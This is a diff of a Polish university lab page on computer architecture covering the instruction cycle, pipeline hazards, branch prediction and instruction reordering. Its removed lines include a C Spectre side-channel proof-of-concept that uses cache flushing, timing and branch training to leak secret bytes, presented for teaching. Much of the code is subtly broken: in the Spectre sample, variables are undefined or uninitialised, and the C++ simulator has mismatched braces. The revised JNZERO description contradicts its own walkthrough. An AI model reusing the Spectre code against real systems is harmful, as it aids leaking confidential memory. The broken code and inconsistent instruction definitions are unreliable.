@@ -1,7 +1,7 @@
 ---
-title: "Lab - whole"
+title: "Architektura komputerów - lab"
 date: 2023-04-24T17:13:33+02:00
-draft: true
+draft: false
 ShowToc: true
 
 ---
@@ -1679,11 +1679,11 @@ Rozważmy prosty przykład dodawania dwóch liczb, przechowywanych w rejestrach 
 Przyjmijmy prosty zestaw rozkazów oparty na hipotetycznym procesorze z ograniczoną architekturą. Rozkazy:
 
 1. LOAD R1, (ADDR) - Ładuje wartość z pamięci o adresie ADDR do rejestru R1.
-2. STORE R1, (ADDR) - Zapisuje wartość z rejestru R1 do pamięci o adresie ADDR.
+2. STORE (ADDR), R1 - Zapisuje wartość z rejestru R1 do pamięci o adresie ADDR.
 3. ADD R1, R2 - Dodaje wartości z rejestru R1 i R2, a wynik zapisuje w rejestrze R1.
 4. SUB R1, R2 - Odejmuje wartość rejestru R2 od wartości rejestru R1, a wynik zapisuje w rejestrze R1.
 5. JUMP ADDR - Bezwarunkowy skok do adresu ADDR.
-6. JZERO R1, ADDR - Skok warunkowy do adresu ADDR, jeśli wartość w rejestrze R1 wynosi 0.
+6. JNZERO R1, ADDR - Skok warunkowy do względnego adresu ADDR, jeśli wartość w rejestrze R1 jest różna od 0.
 
 Omówienie poszczególnych etapów cyklu rozkazowego dla każdego z rozkazów:
 
@@ -1694,7 +1694,7 @@ Omówienie poszczególnych etapów cyklu rozkazowego dla każdego z rozkazów:
     - Wykonanie: Brak operacji wykonawczych dla tego rozkazu.
     - Dostęp do pamięci: Odczyt wartości z pamięci o adresie ADDR.
     - Zapis wyniku: Zapisanie odczytanej wartości do rejestru R1.
-2. STORE R1, (ADDR):
+2. STORE (ADDR), R1:
     
     - Pobieranie: Procesor pobiera rozkaz STORE z pamięci.
     - Dekodowanie: Dekodowanie rozkazu STORE i identyfikacja rejestru R1 oraz adresu pamięci ADDR.
@@ -1723,116 +1723,57 @@ Omówienie poszczególnych etapów cyklu rozkazowego dla każdego z rozkazów:
     - Wykonanie: Aktualizacja licznika rozkazów (PC) na wartość ADDR.
     - Dostęp do pamięci: Brak dostępu do pamięci.
     - Zapis wyniku: Brak operacji zapisu wyniku, ponieważ wynik został już zaktualizowany w liczniku rozkazów (PC).
-6. JZERO R1, ADDR:
+6. JNZERO R1, ADDR:
     
     - Pobieranie: Procesor pobiera rozkaz JZERO z pamięci.
     - Dekodowanie: Dekodowanie rozkazu JZERO i identyfikacja rejestru R1 oraz adresu ADDR.
     - Wykonanie: Sprawdzenie, czy wartość w rejestrze R1 wynosi 0.
     - Dostęp do pamięci: Brak dostępu do pamięci.
-    - Zapis wyniku: Jeśli wartość w rejestrze R1 wynosi 0, aktualizacja licznika rozkazów (PC) na wartość ADDR. W przeciwnym razie PC zostaje zwiększone do kolejnego rozkazu.
+    - Zapis wyniku: Jeśli wartość w rejestrze R1 wynosi 0, aktualizacja licznika rozkazów (PC) o wartość ADDR. W przeciwnym razie PC zostaje zwiększone do kolejnego rozkazu.
 
 Dla każdego z tych rozkazów analiza cyklu rozkazowego obejmuje omówienie poszczególnych faz (pobieranie, dekodowanie, wykonanie, dostęp do pamięci i zapis wyniku) oraz zrozumienie, jak procesor wykonuje te rozkazy sekwencyjnie. W przypadku procesorów z potokiem rozkazowym, kolejne rozkazy mogą być przetwarzane równocześnie w różnych fazach, zwiększając przepustowość procesora i efektywnie przyspieszając wykonywanie programu.
 
-## Prosty symulator cyklu rozkazowego dla prostego procesora
+## Prosty symulator cyklu rozkazowego
 
 
 **Lab_06:**
 
-``` C++
-#include <iostream>
-#include <vector>
-#include <string>
-#include <stdexcept>
 
+Ćwiczenie:
+1. Proszę uruchomić pierwszy program: Lab_06_a
+2. Proszę opisać kolejne cykle rozkazowe, jakie wykonuje procesor
 
-enum class Operation
-{
-    LOAD,
-    STORE,
-    ADD,
-    SUB
-};
-
-class SimpleProcessor {
-public:
-    SimpleProcessor(std::vector<int> memory, std::vector<std::pair<Operation, std::pair<int, int>>> instructions)
-        : memory(std::move(memory)),
-          instructions(std::move(instructions)),
-    registers(3, 0), PC(0) {}
-
-    std::pair<Operation, std::pair<int, int>> fetch() 
-    {
-        auto instruction = instructions[PC];
-        PC++;
-        return instruction;
-    }
-
-    void execute(Operation opcode, std::pair<int, int> operands) 
-    {
-        if (opcode == Operation::LOAD) {
-            registers[operands.first] = memory[operands.second];
-        } else if (opcode == Operation::STORE) {
-            memory[operands.first] = registers[operands.second];
-        } else if (opcode == Operation::ADD) {
-            registers[operands.first] += registers[operands.second];
-        } else if (opcode == Operation::SUB) {
-            registers[operands.first] -= registers[operands.second];
-        } else {
-            throw std::runtime_error("Nieznany rozkaz: " + std::to_string(static_cast<int>(opcode)));
-        }
-    }
-
-    void run() {
-        while (PC < instructions.size()) {
-            const auto instruction = fetch();
-            execute(instruction.first, instruction.second);
-        }
-    }
-
-    [[nodiscard]] std::vector<int> getMemory() const {
-        return memory;
-    }
-
-private:
-    std::vector<int> memory;
-    std::vector<std::pair<Operation, std::pair<int, int>>> instructions;
-    std::vector<int> registers;
-    size_t PC;
-};
-
-int main() {
-    const std::vector<int> memory = {10, 20, 30, 40, 50};
-    const std::vector<std::pair<Operation, std::pair<int, int>>> instructions = {
-        {Operation::LOAD, {0, 0}},
-        {Operation::LOAD, {1, 1}},
-        {Operation::ADD, {0, 1}},
-        {Operation::STORE, {0, 0}},
-
-        {Operation::LOAD, {0, 2}},
-        {Operation::LOAD, {1, 3}},
-        {Operation::ADD, {0, 1}},
-        {Operation::STORE, {1, 0}}
-    };
-
-    std::cout << "Pamiec:";
-    for (const auto& val : memory) {
-        std::cout << " " << val;
-    }
-    std::cout << std::endl;
-
-    SimpleProcessor processor(memory, instructions);
-    processor.run();
-
-    const auto resultMemory = processor.getMemory();
-    std::cout << "Pamiec:";
-    for (const auto& val : resultMemory) {
-        std::cout << " " << val;
-    }
-    std::cout << std::endl;
-
-    return 0;
-}
 ```
+memory = [10, 6, 7, 2, 1, 0, 0]
+instructions = [
+    ("LOAD",  0, 0),
+    ("LOAD",  1, 2),
+    ("ADD",   0, 1),
+    ("STORE", 0, 0),
+]
+```
+
+3. Proszę uruchomić drugi program:  Lab_06_b
+
+```
+memory = [10, 6, 7, 2, 1, 0, 0]
+instructions = [
+    ("LOAD",  0, 0),
+    ("LOAD",  1, 2),
+    ("ADD",   0, 1),
+    ("STORE", 0, 0),
+
+    ("LOAD",  3, 1),
+    ("LOAD",  2, 3),
+    ("SUB",   3, 2),
+    ("STORE", 1, 3),
+
+    ("JNZERO", 3, -9),
+]
+```
+
+4. Proszę opisać cykle rozkazowe dla ostatniej instrukcji. 
+5. Jakie jest działa drugi program? Proszę opisać.
 
 
 # Analiza potoku rozkazowego:
@@ -1853,8 +1794,8 @@ Załóżmy, że mamy prosty procesor z czterema etapami cyklu rozkazowego: pobie
 
 ``` as
   Rozkaz 1: IF -> ID -> EX -> WB
-  Rozkaz 2:      -> IF -> ID -> EX -> WB
-  Rozkaz 3:           -> IF -> ID -> EX -> WB
+  Rozkaz 2:    -> IF -> ID -> EX -> WB
+  Rozkaz 3:          -> IF -> ID -> EX -> WB
   Rozkaz 4:                -> IF -> ID -> EX -> WB
 ```
 
@@ -1868,7 +1809,7 @@ Istnieją trzy główne rodzaje hazardów:
 
    Sposoby minimalizowania hazardów strukturalnych:
    1. Wprowadzenie dodatkowych zasobów: Zwiększenie liczby jednostek wykonawczych, pamięci czy rejestrów może zmniejszyć ryzyko wystąpienia konfliktów.
-   2. Replikacja zasobów: Duplicowanie zasobów pozwala na równoczesne korzystanie z nich przez różne rozkazy.
+   2. Replikacja zasobów: Dodatkowe zasoby pozwalają na równoczesne korzystanie z nich przez różne rozkazy.
    3. Wykorzystanie buforów i kolejkowania: Buforowanie i kolejkowanie operacji może pomóc w zarządzaniu dostępem do zasobów i zmniejszyć opóźnienia.
 
 2. Hazardy danych: Występują, gdy jeden rozkaz jest zależny od wyniku innego rozkazu, który jeszcze nie został zakończony. Hazardy danych mogą prowadzić do nieprawidłowych wyników, jeśli nie zostaną odpowiednio obsłużone.
@@ -1898,109 +1839,6 @@ Istnieją trzy główne rodzaje hazardów:
 Podatność Spectre dotyczy złośliwego wykorzystania spekulatywnego wykonania instrukcji przez procesor w celu uzyskania dostępu do poufnych informacji.
 
 
-```c
-#include <stdio.h>
-#include <stdlib.h>
-#include <stdint.h>
-#include <string.h>
-#include <time.h>
-
-#define CACHE_LINE_SIZE 64
-#define CACHE_SIZE 256
-
-uint8_t timing_array[CACHE_SIZE * CACHE_LINE_SIZE];
-uint8_t temp = 0;
-
-// Funkcja do wyczyszczenia zawartości cache
-void flush_cache() {
-    for (size_t i = 0; i < CACHE_SIZE; i++) {
-        _mm_clflush(&timing_array[i * CACHE_LINE_SIZE]);
-    }
-}
-
-// Funkcja mierząca czas dostępu do danego elementu w timing_array
-uint64_t measure_access_time(void *address) {
-    uint64_t time1, time2;
-
-    uint32_t trash;
-    _asm {
-        lfence
-        rdtsc
-        mov time1, eax
-        mov eax, [address]
-        mov trash, eax
-        rdtsc
-        mov time2, eax
-        lfence
-    }
-
-    return time2 - time1;
-}
-
-// Funkcja wykorzystująca spekulatywne wykonanie instrukcji
-void malicious_code(size_t x, const uint8_t *data, size_t data_length) {
-    if (x < data_length) {
-        temp &= timing_array[data[x] * CACHE_LINE_SIZE];
-    }
-}
-
-void spectre_attack(const uint8_t *data, size_t data_length, uint8_t *output) {
-    size_t training_x = 0;
-    size_t malicious_x;
-
-    for (size_t i = 0; i < 256; i++) {
-        flush_cache();
-
-        // Pętla treningowa
-        for (int j = 0; j < 30; j++) {
-            _mm_lfence();
-            malicious_code(training_x % data_length, data, data_length);
-        }
-
-        // Atak
-        _mm_lfence();
-        malicious_code(malicious_x, data, data_length);
-
-        // Analiza czasów dostępu do timing_array
-        for (size_t i = 0; i < CACHE_SIZE; i++) {
-            uint64_t time = measure_access_time(&timing_array[i * CACHE_LINE_SIZE]);
-
-            if (time < threshold) {
-                output[i]++;
-            }
-        }
-    }
-}
-
-int main() {
-    uint8_t secret_data[] = "Spectre - Secret Data";
-    size_t data_length = sizeof(secret_data);
-    uint8_t output[256] = {0};
-
-    srand(time(NULL));
-    size_t malicious_x = (size_t)(secret_data - (char *)timing_array + (rand() % 256));
-
-    spectre_attack(secret_data, data_length, output);
-
-    for (size_t i = 0; i < 256; i++) {
-        if (output[i]) {
-            printf("Recovered byte at index %zu: 0x%02x ('%c')\n", i, i, (char)i);
-        }
-    }
-
-    return 0;
-}
-```
-
-W powyższym przykładzie, funkcja `malicious_code` jest używana do wywołania spekulatywnego wykonania instrukcji. Funkcja `spectre_attack` zawiera pętlę treningową, która zmusza procesor do spekulatywnego wykonania instrukcji dla wartości `x` znajdującej się w granicach tablicy `data`. Następnie atak polega na przekazaniu wartości `malicious_x`, która wskazuje na tajne dane. W rezultacie procesor próbuje spekulatywnie wykonać instrukcje z funkcji `malicious_code` dla tych danych.
-
-W międzyczasie, funkcje `flush_cache` i `measure_access_time` są używane do analizy czasów dostępu do tablicy `timing_array`. Jeśli dostęp do danego elementu tablicy `timing_array` jest szybki, oznacza to, że był on wcześniej wczytany do pamięci podręcznej przez spekulatywne wykonanie instrukcji. W ten sposób, możliwe jest odtworzenie wartości tajnych danych.
-
-W funkcji `main`, tworzymy tablicę `secret_data` z tajnymi danymi i tablicę `output` do przechowywania wyników ataku. Następnie wywołujemy funkcję `spectre_attack`, która przeprowadza atak i zapisuje wyniki do tablicy `output`. Na koniec, program wypisuje odtworzone tajne dane na podstawie wyników zapisanych w tablicy `output`.
-
-Należy pamiętać, że powyższy przykład jest uproszczony i może nie działać na wszystkich konfiguracjach sprzętowych. Ponadto, współczesne systemy operacyjne i procesory stosują różne techniki łagodzenia podatności Spectre, które mogą wpłynąć na skuteczność tego ataku.
-
-Dodatkowo:
 
 **Przetwarzanie wielowątkowe (multithreading)**: Procesor może przełączać się między różnymi wątkami wykonawczymi, gdy napotyka hazardy kontroli. Pozwala to na utrzymanie potoku rozkazowego aktywnym i wydajnym, nawet gdy jeden wątek oczekuje na wynik rozgałęzienia.
 
@@ -2055,432 +1893,25 @@ W praktyce, zaawansowane mikroarchitektury procesorów stosują różne techniki
 
 ## Zadanie z symulacją: symulator potoku rozkazowego dla prostego procesora, uwzględniając hazardy.
 
-### Pierwszy
+### Hazard danych
 
-Zakładając, że mamy prosty procesor z potokiem rozkazowego o 5 etapach (IF - pobieranie rozkazu, ID - dekodowanie, EX - wykonanie, MEM - dostęp do pamięci, WB - zapis wyniku), poniżej mamy przykład symulatora potoku rozkazowego uwzględniającego hazardy danych.
+Prosty procesor z potokiem rozkazowym o 4 etapach (IF - pobieranie rozkazu, ID - dekodowanie, EX - wykonanie, WB - zapis wyniku)
 
 **Lab_07**
-``` C++	
-#include <iostream>
-#include <vector>
-#include <string>
-#include <map>
 
-// Struktura rozkazu
-struct Instruction {
-    std::string op;
-    std::string rd, rs, rt;
-};
-
-// Przykład programu z potencjalnym hazardem danych
-std::vector<Instruction> program = {
-    {"ADD", "R1", "R2", "R3"},
-    {"SUB", "R4", "R1", "R5"},
-    {"MUL", "R6", "R4", "R7"},
-};
-
-// Rejestry procesora i ich początkowa wartosc
-std::map<std::string, int> registers = {
-    {"R1", 0},
-    {"R2", 1},
-    {"R3", 2},
-    {"R4", 0},
-    {"R5", 3},
-    {"R6", 0},
-    {"R7", 4},
-};
-
-// Symulacja potoku rozkazowego z obsługą hazardów danych
-void simulatePipeline() {
-    int pc = 0;
-    int cycles = 0;
-    int num_instructions = program.size();
-
-    while (pc < num_instructions) {
-        // Symulacja potoku rozkazowego
-        for (int i = 0; i < 5; ++i) {
-            // Jeśli etap jest wykonywany dla ważnego rozkazu
-            if (pc - i >= 0 && pc - i < num_instructions) {
-                Instruction inst = program[pc - i];
-
-                switch (i) {
-                    case 0: // IF - pobieranie rozkazu
-                        std::cout << "IF: " << inst.op << " " << inst.rd << ", " << inst.rs << ", " << inst.rt << std::endl;
-                        break;
-                    case 1: // ID - dekodowanie
-                        std::cout << "ID: " << inst.op << " " << inst.rd << ", " << inst.rs << ", " << inst.rt << std::endl;
-                        // Wstrzymujemy potok, jeśli występuje hazard danych
-                        if (i < num_instructions - 1 && (inst.rd == program[pc - i + 1].rs || inst.rd == program[pc - i + 1].rt)) {
-                            std::cout << "Stalling due to data hazard" << std::endl;
-                            --pc;
-                            break;
-                        }
-                        break;
-                    case 2: // EX - wykonanie
-                        std::cout << "EX: " << inst.op << " " << inst.rd << ", " << inst.rs << ", " << inst.rt << std::endl;
-                        break;
-                    case 3: // MEM - dostęp do pamięci
-                        std::cout << "MEM: " << inst.op << " " << inst.rd << ", " << inst.rs << ", " << inst.rt << std::endl;
-                        break;
-                    case 4: // WB - zapis wyniku
-                        std::cout << "WB: " << inst.op << " " << inst.rd << ", " << inst.rs << ", " << inst.rt << std::endl;
-                        // Aktualizacja rejestrów
-                        if (inst.op == "ADD") {
-                            registers[inst.rd] = registers[inst.rs] + registers[inst.rt];
-                        } else if (inst.op == "SUB") {
-                            registers[inst.rd] = registers[inst.rs] - registers[inst.rt];
-                        } else if (inst.op == "MUL") {
-                            registers[inst.rd] = registers[inst.rs] * registers[inst.rt];
-                        }
-                    	break;
-                }
-            }
-        }
-
-        std::cout << "Cycle: " << ++cycles << std::endl << std::endl;
-        pc++;
-    }
-
-    // Dodajemy dodatkowe cykle dla pozostałych etapów potoku
-    cycles += 4;
-}
-
-int main() {
-    simulatePipeline();
-
-    std::cout << "Final register values:" << std::endl;
-    for (const auto& reg : registers) {
-        std::cout << reg.first << ": " << reg.second << std::endl;
-    }
-
-    return 0;
-}
-```
 
 Powyższy symulator wykonuje sekwencję rozkazów (program) na prostym procesorze. Wprowadza wstrzymanie (stalling) potoku, gdy wykryje hazard danych, co pozwala na zaktualizowanie wartości rejestru przed przekazaniem go do kolejnego rozkazu. Symulator wyświetla etap potoku dla każdego rozkazu oraz numer cyklu. Po zakończeniu symulacji wyświetlane są końcowe wartości rejestrów procesora.
 
-### Drugi
+### Hazard kontroli
 
 Symulator prostego procesora z uwzględnieniem hazardu kontroli (branch hazard). Procesor ten ma prosty potok rozkazów o pięciu etapach: pobieranie rozkazu (IF), dekodowanie (ID), wykonanie (EX), dostęp do pamięci (MEM) i zapis wyniku (WB).
 
-Zakładamy, że procesor obsługuje jedynie trzy rozkazy: dodawanie, odejmowanie i skok warunkowy (z wykorzystaniem instrukcji warunkowej "beq"). Dla uproszczenia, przyjmujemy, że skok warunkowy wykonywany jest tylko, gdy pierwszy argument jest równy zeru.
 
-#### wersja C++
+**Lab_07** + branch predictor
 
-**Lab_08**
-``` C++
-#include <iostream>
-#include <vector>
-#include <string>
-#include <map>
-
-// Struktura rozkazu
-struct Instruction {
-    std::string op;
-    std::string rd, rs, rt;
-    bool is_branch; // Flaga, czy rozkaz to skok warunkowy
-    int branch_target; // Adres docelowy skoku warunkowego
-};
-
-// Przykład programu z potencjalnym hazardem kontroli
-std::vector<Instruction> program = {
-    {"ADD", "R1", "R2", "R3", false, 0},
-    {"SUB", "R4", "R1", "R5", false, 0},
-    {"BEQ", "R1", "R0", "label", true, 4},
-    {"ADD", "R6", "R7", "R8", false, 0},
-    {"label", "", "", "", false, 0},
-    {"ADD", "R9", "R10", "R11", false, 0},
-};
-
-// Rejestry procesora
-std::map<std::string, int> registers = {
-    {"R0", 0},
-    {"R1", 1},
-    {"R2", 2},
-    {"R3", 3},
-    {"R4", 4},
-    {"R5", 5},
-    {"R6", 6},
-    {"R7", 7},
-    {"R8", 8},
-    {"R9", 9},
-    {"R10", 10},
-    {"R11", 11},
-};
-
-// Symulacja potoku rozkazowego z obsługą hazardu kontroli
-void simulatePipeline() {
-    int pc = 0;
-    int cycles = 0;
-    int num_instructions = program.size();
-    bool is_branch_taken = false;
-
-    while (pc < num_instructions) {
-        // Symulacja potoku rozkazowego
-        for (int i = 0; i < 5; ++i) {
-            // Jeśli etap jest wykonywany dla ważnego rozkazu
-            if (pc - i >= 0 && pc - i < num_instructions) {
-                Instruction inst = program[pc - i];
-
-                switch (i) {
-                    case 0: // IF - pobieranie rozkazu
-                        std::cout << "IF: " << inst.op << " " << inst.rd << ", " << inst.rs << ", " << inst.rt << std::endl;
-                        break;
-                    case 1: // ID - dekodowanie
-                        std::cout << "ID: " << inst.op << " " << inst.rd << ", " << inst.rs << ", " << inst.rt << std::endl;
-                    // Wstrzymujemy potok, jeśli występuje hazard kontroli
-                    if (i < num_instructions - 1 && inst.is_branch && is_branch_taken) {
-                        std::cout << "Stalling due to branch hazard" << std::endl;
-                        --pc;
-                        break;
-                    }
-                    break;
-                case 2: // EX - wykonanie
-                    std::cout << "EX: " << inst.op << " " << inst.rd << ", " << inst.rs << ", " << inst.rt << std::endl;
-                    // Sprawdzamy, czy występuje skok warunkowy
-                    if (inst.is_branch && registers[inst.rd] == 0) {
-                        pc = inst.branch_target;
-                        is_branch_taken = true;
-                    } else {
-                        is_branch_taken = false;
-                    }
-                    break;
-                case 3: // MEM - dostęp do pamięci
-                    std::cout << "MEM: " << inst.op << " " << inst.rd << ", " << inst.rs << ", " << inst.rt << std::endl;
-                    break;
-                case 4: // WB - zapis wyniku
-                    std::cout << "WB: " << inst.op << " " << inst.rd << ", " << inst.rs << ", " << inst.rt << std::endl;
-                    // Aktualizacja rejestrów
-                    if (inst.op == "ADD") {
-                        registers[inst.rd] = registers[inst.rs] + registers[inst.rt];
-                    } else if (inst.op == "SUB") {
-                        registers[inst.rd] = registers[inst.rs] - registers[inst.rt];
-                    }
-                    break;
-            }
-        }
-    }
-
-    std::cout << "Cycle: " << ++cycles << std::endl << std::endl;
-    pc++;
-}
-
-// Dodajemy dodatkowe cykle dla pozostałych etapów potoku
-cycles += 4;
-}
-
-int main() {
-	simulatePipeline();
-
-	std::cout << "Final register values:" << std::endl;
-	for (const auto& reg : registers) {
-    	std::cout << reg.first << ": " << reg.second << std::endl;
-	}
-
-return 0;
-```
 
 Symulator wykonuje sekwencję rozkazów na prostym procesorze z potokiem rozkazowym. Wprowadza wstrzymanie (stalling) potoku, gdy wykryje hazard kontroli (branch hazard), co pozwala na zaktualizowanie wartości PC przed pobraniem kolejnego rozkazu. Symulator wyświetla etap potoku dla każdego rozkazu oraz numer cyklu. Po zakończeniu symulacji wyświetlane są końcowe wartości rejestrów procesora.
 
-#### wersja Python
-
-**Lab_08**
-``` python
-class SimpleProcessor:
-    def __init__(self):
-        self.memory = [0] * 1024
-        self.registers = [0] * 32
-        self.PC = 0
-        self.pipeline = [None] * 5
-
-    def load_program(self, program):
-        for i, instruction in enumerate(program):
-            self.memory[i] = instruction
-
-    def fetch(self):
-        if self.PC < len(self.memory):
-            instruction = self.memory[self.PC]
-            self.PC += 4
-            return instruction
-        return None
-
-    def decode(self, instruction):
-        opcode = (instruction >> 26) & 0x3F
-        rs = (instruction >> 21) & 0x1F
-        rt = (instruction >> 16) & 0x1F
-        rd = (instruction >> 11) & 0x1F
-        imm = instruction & 0xFFFF
-        return opcode, rs, rt, rd, imm
-
-    def execute(self, opcode, rs, rt, rd, imm):
-        if opcode == 0:  # add
-            self.registers[rd] = self.registers[rs] + self.registers[rt]
-        elif opcode == 1:  # sub
-            self.registers[rd] = self.registers[rs] - self.registers[rt]
-        elif opcode == 2:  # beq, 
-        	# instrukcja skoku warunkowego (branch if equal), procesor sprawdza, 
-        	# czy wartość pierwszego rejestru źródłowego (rs) jest równa zeru. 
-        	# Jeśli tak, procesor przeskakuje o liczbę instrukcji określoną przez 
-        	# wartość natychmiastową (imm) dodaną do aktualnej wartości licznika programu (PC).
-            if self.registers[rs] == 0:
-                self.PC += imm - 4
-                return True
-        return False
-
-    def run(self):
-        while True:
-            instruction = self.fetch()
-            if instruction is None:
-                break
-
-            opcode, rs, rt, rd, imm = self.decode(instruction)
-            branch_taken = self.execute(opcode, rs, rt, rd, imm)
-
-            if branch_taken:
-                self.PC += 4
-                self.fetch()
-
-processor = SimpleProcessor()
-program = [
-    0b000000_00000_00001_00010_00000_000000,  # add $2, $0, $1
-    0b000001_00000_00001_00011_000000000100,  # sub $3, $0, $1
-    0b000010_00000_00000_00000_000000000100,  # beq $0, $0, 4
-    0b000000_00000_00010_00011_00000_000000,  # add $3, $0, $2
-]
-processor.load_program(program)
-processor.run()
-
-print("Register values:")
-for i, value in enumerate(processor.registers):
-    print(f"${i}: {value}")
-```
-
-
-W przypadku instrukcji skoku warunkowego `beq` (branch if equal), procesor sprawdza, czy wartość pierwszego rejestru źródłowego (rs) jest równa zeru. Jeśli tak, procesor przeskakuje o liczbę instrukcji określoną przez wartość natychmiastową (imm) dodaną do aktualnej wartości licznika programu (PC).
-
-Oto, co dzieje się w przypadku skoku `beq` w funkcji `execute()`:
-
-1. Sprawdzenie, czy wartość w rejestrze `rs` jest równa zeru. Jeśli tak, procesor wykonuje skok warunkowy.
-2. Aktualizacja wartości licznika programu (PC): `self.PC += imm - 4`. Odejmujemy 4, ponieważ PC zostanie zaktualizowany o 4 w funkcji `fetch()` tuż po wykonaniu instrukcji `beq`. Przez to, skok zostaje uwzględniony poprawnie.
-3. Jeśli skok zostanie wykonany, zwracana jest wartość `True`, aby poinformować symulator o konieczności uwzględnienia hazardu kontroli (branch hazard). W przeciwnym przypadku zwracana jest wartość `False`.
-
-W symulatorze, jeśli funkcja `execute()` zwróci wartość `True` (co oznacza, że skok został wykonany), następuje dodatkowy cykl `fetch()`, aby uwzględnić hazard kontroli. W ten sposób, symulator upewnia się, że kolejne instrukcje będą pobierane z właściwego miejsca w pamięci po wykonaniu skoku warunkowego.
-
-Warto zauważyć, że w rzeczywistych procesorach z potokowym przetwarzaniem, takich jak MIPS, hazard kontroli (branch hazard) jest często rozwiązywany przez wprowadzenie opóźnień w potoku (stalls) lub przez techniki przewidywania skoków (branch prediction). W uproszczonym symulatorze te aspekty zostały pominięte dla zwięzłości i prostoty.
-
-
-Funkcja `decode()` jest odpowiedzialna za dekodowanie instrukcji pobranej z pamięci przez etap IF (Instruction Fetch) potoku przetwarzania. Celem dekodowania jest wyodrębnienie informacji związanych z rozkazem, takich jak kod operacji (opcode) oraz rejestry źródłowe i docelowe.
-
-W funkcji `decode()`, instrukcja jest przekazywana jako argument, a następnie wyodrębniane są następujące wartości:
-
-- `opcode`: Kod operacji, który określa rodzaj instrukcji do wykonania (np. dodawanie, odejmowanie lub skok warunkowy). Wartość ta jest uzyskiwana przez przesunięcie bitów instrukcji o 26 pozycji w prawo i zastosowanie maski bitowej `0x3F` (szóstego bitu). W naszym przypadku mamy tylko 3 różne operacje, więc wystarczy 2 bity na reprezentację opkodu: `0b00` dla `add`, `0b01` dla `sub`, `0b10` dla `beq`.
-
-- `rs`: Indeks pierwszego rejestru źródłowego. Jest to wyodrębnione przez przesunięcie bitów instrukcji o 21 pozycji w prawo i zastosowanie maski bitowej `0x1F` (piątego bitu).
-
-- `rt`: Indeks drugiego rejestru źródłowego. Jest to wyodrębnione przez przesunięcie bitów instrukcji o 16 pozycji w prawo i zastosowanie maski bitowej `0x1F` (piątego bitu).
-
-- `rd`: Indeks rejestru docelowego, do którego zapisany zostanie wynik operacji. Jest to wyodrębnione przez przesunięcie bitów instrukcji o 11 pozycji w prawo i zastosowanie maski bitowej `0x1F` (piątego bitu). Zmienna `rd` jest używana tylko dla instrukcji `add` i `sub`.
-
-- `imm`: 16-bitowa wartość natychmiastowa (ang. immediate value) używana w instrukcji skoku warunkowego `beq`. Jest to wyodrębnione poprzez zastosowanie maski bitowej `0xFFFF` (szesnastego bitu) na instrukcji.
-
-Dekodowanie instrukcji pozwala na łatwe odczytanie danych niezbędnych do wykonania operacji przez etap EX (Execute) potoku przetwarzania.
-
-
-### Wersja z branch prediction:
-
-**Lab_09**
-``` python
-class SimpleProcessor:
-    def __init__(self):
-        self.memory = [0] * 1024
-        self.registers = [0] * 32
-        self.PC = 0
-        self.stall_count = 0
-        self.branch_prediction_always_taken = True
-
-    def load_program(self, program):
-        for i, instruction in enumerate(program):
-            self.memory[i] = instruction
-
-    def fetch(self):
-        if self.PC < len(self.memory):
-            instruction = self.memory[self.PC]
-            self.PC += 4
-            return instruction
-        return None
-
-    def decode(self, instruction):
-        opcode = (instruction >> 26) & 0x3F
-        rs = (instruction >> 21) & 0x1F
-        rt = (instruction >> 16) & 0x1F
-        rd = (instruction >> 11) & 0x1F
-        imm = instruction & 0xFFFF
-        return opcode, rs, rt, rd, imm
-
-    def execute(self, opcode, rs, rt, rd, imm):
-        if opcode == 0:  # add
-            self.registers[rd] = self.registers[rs] + self.registers[rt]
-        elif opcode == 1:  # sub
-            self.registers[rd] = self.registers[rs] - self.registers[rt]
-        elif opcode == 2:  # beq
-            if self.registers[rs] == 0:
-                self.PC += imm - 4
-                return True
-        return False
-
-    def handle_branch_hazard(self):
-        if self.stall_count > 0:
-            self.stall_count -= 1
-        else:
-            instruction = self.fetch()
-            if instruction is None:
-                return
-
-            opcode, rs, rt, rd, imm = self.decode(instruction)
-            branch_taken = self.execute(opcode, rs, rt, rd, imm)
-
-            if opcode == 2:  # beq
-                if self.branch_prediction_always_taken:
-                    if not branch_taken:
-                        self.stall_count = 1
-                else:
-                    if branch_taken:
-                        self.stall_count = 1
-
-    def run(self):
-        while True:
-            self.handle_branch_hazard()
-            if self.PC >= len(self.memory) and self.stall_count == 0:
-                break
-
-processor = SimpleProcessor()
-program = [
-    0b000000_00000_00001_00010_00000_000000,  # add $2, $0, $1
-    0b000001_00000_00001_00011_000000000100,  # sub $3, $0, $1
-    0b000010_00000_00000_00000_000000000100,  # beq $0, $0, 4
-    0b000000_00000_00010_00011_00000_000000,  # add $3, $0, $2
-]
-processor.load_program(program)
-processor.run()
-
-print("Register values:")
-for i, value in enumerate(processor.registers):
-    print(f"${i}: {value}")
-```
-
-W powyższym kodzie symulatora prostego procesora uwzględniono opóźnienie w potoku (stall) oraz prostą technikę przewidywania skoków (branch prediction). 
-
-<!-- 
-1. Dodano zmienną `self.stall_count` do przechowywania liczby cykli opóźnienia potoku (stalls) oraz zmienną `self.branch_prediction_always_taken` do określenia polityki przewidywania skoków.
-
-2. Zastąpiono funkcję `run()` funkcją `handle_branch_hazard()`, która teraz obsługuje cały proces wykonywania instrukcji, w tym hazard kontroli. Funkcja ta:
-    1. Sprawdza, czy występują opóźnienia w potoku (stalls) i zmniejsza ich liczbę, jeśli tak.
-    2. Pobiera, dekoduje i wykonuje instrukcje.
-    3. Obsługuje hazard kontroli dla instrukcji `beq`, sprawdzając politykę przewidywania skoków, a następnie wprowadza opóźnienie w potoku (stall), jeśli przewidywanie było błędne.
-
-3. Zmodyfikowano funkcję `run()`, która teraz korzysta z funkcji `handle_branch_hazard()` do iteracyjnego wykonywania instrukcji. Funkcja `run()` kończy działanie, gdy licznik programu (PC) przekroczy długość pamięci, a liczba opóźnień w potoku wyniesie 0.
-
-W wyniku tych zmian, zmodyfikowany symulator uwzględnia opóźnienia w potoku (stalls) oraz przewidywanie skoków (branch prediction). Warto zauważyć, że w rzeczywistych procesorach przewidywanie skoków może być znacznie bardziej zaawansowane, z użyciem dynamicznych technik, takich jak bufor przewidywania skoków (branch target buffer) czy tablica historii skoków (branch history table). W uproszczonym symulatorze używamy prostej, statycznej polityki przewidywania "zawsze wykonuj skok" dla celów demonstracyjnych. -->
 
 # Instruction reordering
 
@@ -2490,52 +1921,168 @@ Oto prosty program w C++, który ilustruje reordering instrukcji na procesorze x
 
 **Lab_10**
 ```cpp
-#include <atomic>
-#include <iostream>
-#include <thread>
-#include <vector>
+#include <pthread.h>
+#include <semaphore.h>
+#include <stdio.h>
 
-std::atomic<int> x{0}, y{0};
-std::atomic<int> count{0};
+// Set either of these to 1 to prevent CPU reordering
+#define USE_CPU_FENCE              0
